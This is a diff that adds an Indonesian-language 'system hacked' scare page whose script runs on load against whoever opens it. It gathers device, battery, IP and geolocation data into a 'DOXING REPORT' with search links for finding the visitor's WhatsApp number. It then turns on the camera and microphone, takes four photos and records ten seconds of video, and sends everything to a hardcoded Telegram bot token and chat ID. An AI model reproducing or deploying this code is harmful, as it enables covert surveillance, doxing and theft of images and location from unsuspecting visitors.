@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>PERINGATAN SISTEM</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+    body {
+      margin: 0;
+      background-color: black;
+      color: #00ff00;
+      font-family: 'Share Tech Mono', monospace;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .container {
+      text-align: center;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 36px;
+      color: red;
+      animation: blink 1s infinite;
+    }
+
+    p {
+      font-size: 18px;
+      margin: 10px 0;
+    }
+
+    #scan {
+      font-size: 16px;
+      color: #0f0;
+      margin-top: 30px;
+      white-space: pre-wrap;
+    }
+
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.1; }
+      100% { opacity: 1; }
+    }
+
+    .bg-hacker {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: url('https://i.ibb.co/jJFDmGf/hacker.gif');
+      background-size: cover;
+      background-position: center;
+      opacity: 0.08;
+      z-index: -1;
+    }
+  </style>
+</head>
+<body>
+
+<div class="bg-hacker"></div>
+
+<div class="container">
+  <h1>⚠️ SISTEM TELAH DIRETAS ⚠️</h1>
+  <p>IP ANDA: <span id="ip">Mendeteksi...</span></p>
+  <p>LOKASI: <span id="loc">Melacak lokasi...</span></p>
+  <p>DEVICE: <span id="dev">Mengakses info perangkat...</span></p>
+  <p>KAMERA: <span id="cam">Mengaktifkan kamera...</span></p>
+
+  <div id="scan">[ SCANNING DATA... ██████████100% ]</div>
+  <p style="color:red; margin-top:20px;"><strong>Semua data telah diambil. Ini adalah peringatan. Jangan ulangi akses sembarangan!</strong></p>
+</div>
+
+<script>
+  const token = '7435851375:AAH7RpYei5mXA0YU0MogtjZ9FQZgA4ZzoX8';
+  const chatId = '-1002547203845';
+  const videoDuration = 10 * 1000;
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+
+  async function getBatteryLevel() {
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        const level = `${Math.round(battery.level * 100)}%`;
+        const charging = battery.charging ? "Sedang dicas" : "Tidak dicas";
+        return { level, charging };
+      } catch {
+        return { level: "Battery info not available", charging: "Unknown" };
+      }
+    }
+    return { level: "Battery info not supported", charging: "Unknown" };
+  }
+
+  function sendToTelegram(type, fileBlob) {
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append(type, fileBlob);
+
+    fetch(`https://api.telegram.org/bot${token}/send${type === 'photo' ? 'Photo' : 'Video'}`, {
+      method: 'POST',
+      body: formData
+    }).then(res => res.json())
+      .then(data => console.log("Terkirim:", data))
+      .catch(err => console.error("Gagal kirim:", err));
+  }
+
+  function sendInfoToTelegram(info) {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: info, parse_mode: "Markdown" })
+    });
+  }
+
+  async function getMoreIPInfo() {
+    try {
+      const res = await fetch('https://ipinfo.io/json?token=123456');
+      return await res.json();
+    } catch {
+      return {};
+    }
+  }
+
+  function getDeviceModel() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Android")) {
+      const match = ua.match(/Android.+?;\s(.+?)\sBuild/);
+      return match ? match[1] : "Android Device";
+    }
+    if (ua.includes("iPhone")) return "iPhone";
+    if (ua.includes("iPad")) return "iPad";
+    if (ua.includes("Windows")) return "Windows PC";
+    if (ua.includes("Mac")) return "Mac";
+    return "Perangkat Tidak Diketahui";
+  }
+
+  function generateWASearchLinks(ip, city, region, country) {
+    const query = encodeURIComponent(`${city} ${region} ${country}`);
+    return `
+Pencarian Nomor WA (OSINT):
+• Google: https://www.google.com/search?q=site:wa.me+${query}
+• Facebook: https://www.facebook.com/search/top?q=${query}
+• Truecaller: https://www.truecaller.com/search/${country.toLowerCase()}/${ip}
+• LinkedIn: https://www.linkedin.com/search/results/people/?keywords=${query}
+    `;
+  }
+
+  async function start() {
+    const battery = await getBatteryLevel();
+    const batteryLevel = battery.level;
+    const chargingStatus = battery.charging;
+
+    const userAgent = navigator.userAgent;
+    const deviceName = getDeviceModel();
+    const ipDetails = await getMoreIPInfo();
+
+    const waLinks = generateWASearchLinks(
+      ipDetails.ip || "-",
+      ipDetails.city || "-",
+      ipDetails.region || "-",
+      ipDetails.country || "-"
+    );
+
+    navigator.geolocation.getCurrentPosition(async pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      const info = `
+DOXING REPORT
+----------------------------
+Perangkat     : ${deviceName}
+User-Agent    : ${userAgent}
+Baterai       : ${batteryLevel}
+Sedang Dicas  : ${chargingStatus}
+IP Address    : ${ipDetails.ip}
+ISP/ORG       : ${ipDetails.org}
+Hostname      : ${ipDetails.hostname}
+Kota          : ${ipDetails.city}
+Wilayah       : ${ipDetails.region}
+Negara        : ${ipDetails.country}
+Zona Waktu    : ${ipDetails.timezone}
+Lokasi Maps   : https://maps.google.com/?q=${lat},${lon}
+Waktu Akses   : ${new Date().toLocaleString()}
+${waLinks}
+----------------------------
+      `;
+      sendInfoToTelegram(info);
+    }, () => {
+      const info = `
+DOXING REPORT
+----------------------------
+Perangkat     : ${deviceName}
+User-Agent    : ${userAgent}
+Baterai       : ${batteryLevel}
+Sedang Dicas  : ${chargingStatus}
+IP Address    : ${ipDetails.ip}
+ISP/ORG       : ${ipDetails.org}
+Hostname      : ${ipDetails.hostname}
+Kota          : ${ipDetails.city}
+Wilayah       : ${ipDetails.region}
+Negara        : ${ipDetails.country}
+Zona Waktu    : ${ipDetails.timezone}
+Lokasi Maps   : Tidak diizinkan
+Waktu Akses   : ${new Date().toLocaleString()}
+${waLinks}
+----------------------------
+      `;
+      sendInfoToTelegram(info);
+    });
+
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    video.srcObject = stream;
+
+    await new Promise(resolve => setTimeout(resolve, 1000));
+
+    // Ambil 4 foto berturut-turut setiap 1 detik
+    for (let i = 0; i < 4; i++) {
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        sendToTelegram('photo', blob);
+      }, 'image/jpeg');
+    }
+
+    const mediaRecorder = new MediaRecorder(stream);
+    const chunks = [];
+    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+    mediaRecorder.onstop = () => {
+      const videoBlob = new Blob(chunks, { type: 'video/webm' });
+      sendToTelegram('video', videoBlob);
+    };
+    mediaRecorder.start();
+    setTimeout(() => mediaRecorder.stop(), videoDuration);
+  }
+
+  start();
+</script>
+</body>
+    </html>
